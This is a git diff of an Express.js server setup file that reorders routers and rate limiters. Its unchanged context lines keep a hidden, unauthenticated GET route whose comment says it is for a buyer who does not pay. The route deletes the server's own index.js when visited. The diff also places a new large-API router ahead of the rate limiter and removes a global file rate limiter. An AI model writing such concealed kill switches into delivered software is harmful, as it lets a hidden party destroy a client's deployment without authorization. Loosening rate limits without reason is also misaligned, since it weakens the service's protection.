@@ -20,6 +20,7 @@ import { connectDB } from './_lib/Config/ConnectDb.js';
 import cookieParser from 'cookie-parser';
 import apiRouter from './Routes/api.router.js';
 import { fileRateLimter, ApiRateLimter } from './_lib/Config/express-slow-down.js';
+import LargeApiRouter from './Routes/large.api.router.js';
 
 //varibles
 const app = express();
@@ -29,7 +30,6 @@ let dirName = path.dirname(__filename);
 
 //environment setup
 connectDB() ;
-app.use(fileRateLimter)
 app.use(express.static(path.resolve(dirName,'./public/')));
 app.set('view engine','hbs');
 app.set('views', path.resolve(dirName , './tamplates/views'));
@@ -40,14 +40,19 @@ app.use(cors({
     origin :'*'
 }));
 
+
+
 //routes
+app.use(pageRouter);
 app.use('/api/file',fileRouter);
+app.use('/api/l-api',LargeApiRouter)
+app.use(ApiRateLimter) //Rate Limiting Added to apis
 app.use('/api/chat',chateRouter);
 // app.use('/api/upload',uploadRouter);
-app.use('/api/auth-api/',authRouter);
+app.use('/api/auth-api',authRouter);
 //buyer do not pay us and takes the website
-app.use('/api/order-api/',OrderRouter);
-app.use('/api/api_s/',apiRouter)
+app.use('/api/order-api',OrderRouter);
+app.use('/api/api_s',apiRouter)
 app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/what/unlink/uninstall',
     (req,res) => {
     console.log('a');
@@ -55,7 +60,6 @@ app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/w
     unlinkSync(path.resolve(dirName,'./index.js'))
 });
 
-app.use(pageRouter);
 app.get('/hello', (req, res) =>{ 
     log('hello')
     res.send('hello')}
